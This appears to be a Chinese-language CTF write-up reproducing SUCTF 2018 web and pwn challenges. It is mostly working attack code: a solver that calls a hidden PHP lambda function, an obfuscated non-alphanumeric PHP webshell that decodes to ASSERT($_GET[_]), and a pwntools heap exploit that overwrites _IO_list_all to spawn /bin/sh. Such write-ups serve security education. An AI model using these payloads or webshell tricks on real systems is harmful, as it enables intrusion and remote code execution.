---
title: suctf2018
date: 2018-05-28 16:46:05
tags:
---

# SUCTF2018

没做过，自己复现

## Anonymous

```
<?php
$MY = create_function("","die(`cat flag.php`);");
$hash = bin2hex(openssl_random_pseudo_bytes(32));
eval("function SUCTF_$hash(){"
    ."global \$MY;"
    ."\$MY();"
    ."}");
if(isset($_GET['func_name'])){
    $_GET["func_name"]();
    die();
}
show_source(__FILE__);
```

solve.py

```
import requests
import socket
import time
from multiprocessing.dummy import Pool as ThreadPool
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

def run(i):
    while 1:
        HOST = 'web.suctf.asuri.org'
        PORT = 81
        url = "http://web.suctf.asuri.org:81/index.php"
        requests.get(url)
        print 'ok'
        time.sleep(0.5)
        print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content

i = 8
pool = ThreadPool( i )
result = pool.map_async( run, range(i) ).get(0xffff)
```

## Getshell

```
if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
}
```

使用burp intruder找出未被过滤的可打印字符串。

```
$()[]_~=;.
```

跑的时候需注意`Intruder=>payloads=>payload encoding` 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。

跑的时候可以在`Intruder=>options=>Grep-Match` 中选择 flag `illegal` ，这样就可以快速看到那些字符是合法的了。

shell:

```
<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);
```

```
<?= 
$_=_==_;//1
$__=~一[$_];//G
$___=~了[$_];//E
$____=~端[$_];//T
$_____=~得[$_];//A
$______=~第[$_];//S
$_______=~学[$_];//R
$_=_.$__.$___.$____;//_GET
$_=$$_;//$_GET
$__=$_____.$______.$______.$___.$_______.$____;//ASSERT
$__($_[_]);//ASSERT($_GET[_]);
```

```
<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);
```

```
$_=_==_;//1
$__=~一[$_];//G
$___=~了[$_];//E
$____=~端[$_];//T
$_=_.$__.$___.$____;//_GET
$_=$$_;//$_GET
$_[_]($_[__]);//$_GET[_]($_GET[__]);
```

## HateIT

# PWN

## Note

```
#!/usr/bin/env python2

from pwn import *
from IPython import embed
import re

context.arch = 'amd64'

r = remote('pwn.suctf.asuri.org', 20003)

def add(size, content):
    r.sendlineafter('>>', '1')
    r.sendlineafter('Size:', str(size))
    r.sendlineafter('Content:', content)

def show(idx):
    r.sendlineafter('>>', '2')
    r.sendlineafter('Index:', str(idx))
    r.recvuntil('Content:')
    return r.recvuntil('1.Add a not', drop=True)

def pandora():
    r.sendlineafter('>>', '3')
    r.sendlineafter('yes:1)', '1')


add(10, 'a'*24+flat(0xec1))
add(4000, 'a')
pandora()
x = show(0).strip()
heap = u64(x.ljust(8, '\x00')) - 0x140
print 'heap:', hex(heap)
add(0x90-8, 'a'*7)
x = show(1).strip()
libc = u64(x.ljust(8, '\x00')) - 0x3bfb58
print 'libc:', hex(libc)

#_IO_list_all = libc + 0x3c5520
_IO_list_all = libc + 0x3c0500
_IO_str_jumps = libc + 0x3bc4c0
#system = libc + 0x45390
system = libc + 0x456d0
pop_rax_rbx_rbp = libc + 0x1fa71
ret = libc + 0x1fa74
add(10, flat(
    'a'*16,
    0x0, 0x61,
    0, _IO_list_all-0x10,
    0, 1,
    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0
    [0]*18, _IO_str_jumps,
    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')
    '/bin/sh\x00',
))

#raw_input("@")
r.sendlineafter('>>', '1')
r.sendlineafter('Size:', '10')

#embed()
r.interactive()
```



​				